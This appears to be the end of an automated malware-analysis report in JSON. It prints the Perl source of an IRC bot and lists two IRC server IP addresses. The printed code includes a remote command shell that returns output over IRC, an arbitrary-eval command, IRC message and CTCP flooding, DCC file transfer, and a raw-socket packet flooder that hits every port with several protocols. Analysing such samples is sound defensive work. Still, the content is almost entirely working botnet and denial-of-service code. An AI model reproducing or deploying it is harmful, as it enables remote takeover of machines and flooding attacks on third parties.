            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002M\u5daeia de envio\\002: \".int((($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)/$dtime).\" kbps\");",
            "           }",
            "           exit;",
            "       }",
            "sub ircase {",
            "  my ($kem, $printl, $case) = @_;",
            "  if ($case =~ /^join (.*)/) {",
            "     j(\"$1\");",
            "   } ",
            "   if ($case =~ /^part (.*)/) {",
            "      p(\"$1\");",
            "   }",
            "   if ($case =~ /^rejoin\\s+(.*)/) {",
            "      my $chan = $1;",
            "      if ($chan =~ /^(\\d+) (.*)/) {",
            "        for (my $ca = 1; $ca <= $1; $ca++ ) {",
            "          p(\"$2\");",
            "          j(\"$2\");",
            "        }",
            "      } else {",
            "          p(\"$chan\");",
            "          j(\"$chan\");",
            "      }",
            "   }",
            "   if ($case =~ /^op/) {",
            "      op(\"$printl\", \"$kem\") if $case eq \"op\";",
            "      my $oarg = substr($case, 3);",
            "      op(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   if ($case =~ /^deop/) {",
            "      deop(\"$printl\", \"$kem\") if $case eq \"deop\";",
            "      my $oarg = substr($case, 5);",
            "      deop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   if ($case =~ /^voice/) {",
            "      voice(\"$printl\", \"$kem\") if $case eq \"voice\";",
            "      $oarg = substr($case, 6);",
            "      voice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   if ($case =~ /^devoice/) {",
            "      devoice(\"$printl\", \"$kem\") if $case eq \"devoice\";",
            "      $oarg = substr($case, 8);",
            "      devoice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   if ($case =~ /^msg\\s+(\\S+) (.*)/) {",
            "      msg(\"$1\", \"$2\");",
            "   }",
            "   if ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "      for (my $cf = 1; $cf <= $1; $cf++) {",
            "        msg(\"$2\", \"$3\");",
            "      }",
            "   }",
            "   if ($case =~ /^ctcp\\s+(\\S+) (.*)/) {",
            "      ctcp(\"$1\", \"$2\");",
            "   }",
            "   if ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "      for (my $cf = 1; $cf <= $1; $cf++) {",
            "        ctcp(\"$2\", \"$3\");",
            "      }",
            "   }",
            "   if ($case =~ /^invite\\s+(\\S+) (.*)/) {",
            "      invite(\"$1\", \"$2\");",
            "   }",
            "   if ($case =~ /^nick (.*)/) {",
            "      nick(\"$1\");",
            "   }",
            "   if ($case =~ /^conecta\\s+(\\S+)\\s+(\\S+)/) {",
            "       conectar(\"$2\", \"$1\", 6667);",
            "   }",
            "   if ($case =~ /^send\\s+(\\S+)\\s+(\\S+)/) {",
            "      DCC::SEND(\"$1\", \"$2\");",
            "   }",
            "   if ($case =~ /^raw (.*)/) {",
            "      sendraw(\"$1\");",
            "   }",
            "   if ($case =~ /^eval (.*)/) {",
            "     eval \"$1\";",
            "   }",
            "sub shell {",
            "  return unless $secv;",
            "  my $printl=$_[0];",
            "  my $comando=$_[1];",
            "  if ($comando =~ /cd (.*)/) {",
            "    chdir(\"$1\") || msg(\"$printl\", \"Dir doesnt exist!\");",
            "    return;",
            "  } ",
            "  elsif ($pid = fork) {",
            "     waitpid($pid, 0);",
            "  } else {",
            "      if (fork) {",
            "         exit;",
            "       } else {",
            "           my @resp=`$comando 2>&1 3>&1`;",
            "           my $c=0;",
            "           foreach my $linha (@resp) {",
            "             $c++;",
            "             chop $linha;",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");",
            "             if ($c == \"$linas_max\") {",
            "               $c=0;",
            "               sleep $sleep;",
            "             }",
            "           }",
            "           exit;",
            "       }",
            "sub attacker {",
            "  my $iaddr = inet_aton($_[0]);",
            "  my $msg = 'B' x $_[1];",
            "  my $ftime = $_[2];",
            "  my $cp = 0;",
            "  my (%pacotes);",
            "  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;",
            "  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;",
            "  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;",
            "  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;",
            "  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;",
            "  return(undef) if $cp == 4;",
            "  my $itime = time;",
            "  my ($cur_time);",
            "  while ( 1 ) {",
            "     for (my $porta = 1; $porta <= 65535; $porta++) {",
            "       $cur_time = time - $itime;",
            "       last if $cur_time >= $ftime;",
            "       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;",
            "       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;",
            "       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;",
            "       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;",
            "       for (my $pc = 3; $pc <= 255;$pc++) {",
            "         next if $pc == 6;",
            "         $cur_time = time - $itime;",
            "         last if $cur_time >= $ftime;",
            "         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;",
            "         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;;",
            "       }",
            "     }",
            "     last if $cur_time >= $ftime;",
            "  return($cur_time, %pacotes);",
            "sub action {",
            "   return unless $#_ == 1;",
            "   sendraw(\"PRIVMSG $_[0] :\\001ACTION $_[1]\\001\");",
            "sub ctcp {",
            "   return unless $#_ == 1;",
            "   sendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");",
            "sub msg {",
            "   return unless $#_ == 1;",
            "   sendraw(\"PRIVMSG $_[0] :$_[1]\");",
            "sub notice {",
            "   return unless $#_ == 1;",
            "   sendraw(\"NOTICE $_[0] :$_[1]\");",
            "sub op {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +o $_[1]\");",
            "sub deop {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] -o $_[1]\");",
            "sub hop {",
            "    return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +h $_[1]\");",
            "sub dehop {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +h $_[1]\");",
            "sub voice {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +v $_[1]\");",
            "sub devoice {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] -v $_[1]\");",
            "sub ban {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +b $_[1]\");",
            "sub unban {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] -b $_[1]\");",
            "sub kick {",
            "   return unless $#_ == 1;",
            "   sendraw(\"KICK $_[0] $_[1] :$_[2]\");",
            "sub modo {",
            "   return unless $#_ == 0;",
            "   sendraw(\"MODE $_[0] $_[1]\");",
            "sub mode { modo(@_); }",
            "sub j { &join(@_); }",
            "sub join {",
            "   return unless $#_ == 0;",
            "   sendraw(\"JOIN $_[0]\");",
            "sub p { part(@_); }",
            "sub part {sendraw(\"PART $_[0]\");}",
            "sub nick {",
            "  return unless $#_ == 0;",
            "  sendraw(\"NICK $_[0]\");",
            "sub invite {",
            "   return unless $#_ == 1;",
            "   sendraw(\"INVITE $_[1] $_[0]\");",
            "sub topico {",
            "   return unless $#_ == 1;",
            "   sendraw(\"TOPIC $_[0] $_[1]\");",
            "sub topic { topico(@_); }",
            "sub whois {",
            "  return unless $#_ == 0;",
            "  sendraw(\"WHOIS $_[0]\");",
            "sub who {",
            "  return unless $#_ == 0;",
            "  sendraw(\"WHO $_[0]\");",
            "sub names {",
            "  return unless $#_ == 0;",
            "  sendraw(\"NAMES $_[0]\");",
            "sub away {",
            "  sendraw(\"AWAY $_[0]\");",
            "sub back { away(); }",
            "sub quit {",
            "  sendraw(\"QUIT :$_[0]\");",
            "package DCC;",
            "sub connections {",
            "   my @ready = $dcc_sel->can_read(1);",
            "   foreach my $fh (@ready) {",
            "     my $dcctipo = $DCC{$fh}{tipo};",
            "     my $arquivo = $DCC{$fh}{arquivo};",
            "     my $bytes = $DCC{$fh}{bytes};",
            "     my $cur_byte = $DCC{$fh}{curbyte};",
            "     my $nick = $DCC{$fh}{nick};",
            "     my $msg;",
            "     my $nread = sysread($fh, $msg, 10240);",
            "     if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {",
            "        $DCC{$fh}{status} = \"Cancelado\";",
            "        $DCC{$fh}{ftime} = time;",
            "        $dcc_sel->remove($fh);",
            "        $fh->close;",
            "        next;",
            "     }",
            "     if ($dcctipo eq \"get\") {",
            "        $DCC{$fh}{curbyte} += length($msg);",
            "        my $cur_byte = $DCC{$fh}{curbyte};",
            "        open(FILE, \">> $arquivo\");",
            "        print FILE \"$msg\" if ($cur_byte <= $bytes);",
            "        close(FILE);",
            "        my $packbyte = pack(\"N\", $cur_byte);",
            "        print $fh \"$packbyte\";",
            "        if ($bytes == $cur_byte) {",
            "           $dcc_sel->remove($fh);",
            "           $fh->close;",
            "           $DCC{$fh}{status} = \"Recived\";",
            "           $DCC{$fh}{ftime} = time;",
            "           next;",
            "        }",
            "     } elsif ($dcctipo eq \"send\") {",
            "          my $send = $fh->accept;",
            "          $send->autoflush(1);",
            "          $dcc_sel->add($send);",
            "          $dcc_sel->remove($fh);",
            "          $DCC{$send}{tipo} = 'sendcon';",
            "          $DCC{$send}{itime} = time;",
            "          $DCC{$send}{nick} = $nick;",
            "          $DCC{$send}{bytes} = $bytes;",
            "          $DCC{$send}{curbyte} = 0;",
            "          $DCC{$send}{arquivo} = $arquivo;",
            "          $DCC{$send}{ip} = $send->peerhost;",
            "          $DCC{$send}{porta} = $send->peerport;",
            "          $DCC{$send}{status} = \"Enviando\";",
            "          open(FILE, \"< $arquivo\");",
            "          my $fbytes;",
            "          read(FILE, $fbytes, 1024);",
            "          print $send \"$fbytes\";",
            "          close FILE;",
            "     } elsif ($dcctipo eq 'sendcon') {",
            "          my $bytes_sended = unpack(\"N\", $msg);",
            "          $DCC{$fh}{curbyte} = $bytes_sended;",
            "          if ($bytes_sended == $bytes) {",
            "             $fh->close;",
            "             $dcc_sel->remove($fh);",
            "             $DCC{$fh}{status} = \"Enviado\";",
            "             $DCC{$fh}{ftime} = time;",
            "             next;",
            "          }",
            "          open(SENDFILE, \"< $arquivo\");",
            "          seek(SENDFILE, $bytes_sended, 0);",
            "          my $send_bytes;",
            "          read(SENDFILE, $send_bytes, 1024);",
            "          print $fh \"$send_bytes\";",
            "          close(SENDFILE);",
            "     }",
            "   }",
            "sub SEND {",
            "  my ($nick, $arquivo) = @_;",
            "  unless (-r \"$arquivo\") {",
            "    return(0);",
            "  my $dccark = $arquivo;",
            "  $dccark =~ s/[.*\\/](\\S+)/$1/;",
            "  my $meuip = $::irc_servers{\"$::IRC_cur_socket\"}{'meuip'};",
            "  my $longip = unpack(\"N\",inet_aton($meuip));",
            "  my @filestat = stat($arquivo);",
            "  my $size_total=$filestat[7];",
            "  if ($size_total == 0) {",
            "     return(0);",
            "  my ($porta, $sendsock);",
            "  do {",
            "    $porta = int rand(64511);",
            "    $porta += 1024;",
            "    $sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => 'tcp') and $dcc_sel->add($sendsock);",
            "  } until $sendsock;",
            "  $DCC{$sendsock}{tipo} = 'send';",
            "  $DCC{$sendsock}{nick} = $nick;",
            "  $DCC{$sendsock}{bytes} = $size_total;",
            "  $DCC{$sendsock}{arquivo} = $arquivo;",
            "  &::ctcp(\"$nick\", \"DCC SEND $dccark $longip $porta $size_total\");",
            "sub GET {",
            "  my ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;",
            "  return(0) if (-e \"$arquivo\");",
            "  if (open(FILE, \"> $arquivo\")) {",
            "     close FILE;",
            "  } else { ",
            "    return(0); ",
            "  my $dccip=fixaddr($dcclongip);",
            "  return(0) if ($dccporta < 1024 or not defined $dccip or $bytes < 1);",
            "  my $dccsock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);",
            "  $dccsock->autoflush(1);",
            "  $dcc_sel->add($dccsock);",
            "  $DCC{$dccsock}{tipo} = 'get';",
            "  $DCC{$dccsock}{itime} = time;",
            "  $DCC{$dccsock}{nick} = $nick;",
            "  $DCC{$dccsock}{bytes} = $bytes;",
            "  $DCC{$dccsock}{curbyte} = 0;",
            "  $DCC{$dccsock}{arquivo} = $arquivo;",
            "  $DCC{$dccsock}{ip} = $dccip;",
            "  $DCC{$dccsock}{porta} = $dccporta;",
            "  $DCC{$dccsock}{status} = \"Recebendo\";",
            "sub Status {",
            "  my $socket = shift;",
            "  my $sock_tipo = $DCC{$socket}{tipo};",
            "  unless (lc($sock_tipo) eq \"chat\") {",
            "    my $nick = $DCC{$socket}{nick};",
            "    my $arquivo = $DCC{$socket}{arquivo};",
            "    my $itime = $DCC{$socket}{itime};",
            "    my $ftime = time;",
            "    my $status = $DCC{$socket}{status};",
            "    $ftime = $DCC{$socket}{ftime} if defined($DCC{$socket}{ftime});",
            "    my $d_time = $ftime-$itime;",
            "    my $cur_byte = $DCC{$socket}{curbyte};",
            "    my $bytes_total =  $DCC{$socket}{bytes};",
            "    my $rate = 0;",
            "    $rate = ($cur_byte/1024)/$d_time if $cur_byte > 0;",
            "    my $porcen = ($cur_byte*100)/$bytes_total;",
            "    my ($r_duv, $p_duv);",
            "    if ($rate =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {",
            "       $r_duv = $3; $r_duv++ if $4 >= 5;",
            "       $rate = \"$1\\.$2\".\"$r_duv\";",
            "    }",
            "    if ($porcen =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {",
            "       $p_duv = $3; $p_duv++ if $4 >= 5;",
            "       $porcen = \"$1\\.$2\".\"$p_duv\";",
            "    }",
            "    return(\"$sock_tipo\",\"$status\",\"$nick\",\"$arquivo\",\"$bytes_total\", \"$cur_byte\",\"$d_time\", \"$rate\", \"$porcen\");",
            "  return(0);",
            "sub fixaddr {",
            "    my ($address) = @_;",
            "    chomp $address;",
            "    if ($address =~ /^\\d+$/) {",
            "        return inet_ntoa(pack \"N\", $address);",
            "    } elsif ($address =~ /^[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}$/) {",
            "        return $address;",
            "    } elsif ($address =~ tr/a-zA-Z//) {",
            "        return inet_ntoa(((gethostbyname($address))[4])[0]);",
            "    } else {",
            "        return;",
            "    }"
        ],
        "file": {},
        "fuzzing": {
            "Possible encoded string": [
                "my @canais=(\"#\\xBC\\xBD\\xBE :lametrapchan\",\"#\\xBC\\xBD\\xBE :lametrapchan\");"
            ]
        },
        "ip": [
            "195.204.1.130",
            "194.109.20.90"
        ],
        "url": []
    },
    "time": "0:00:00.382634",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
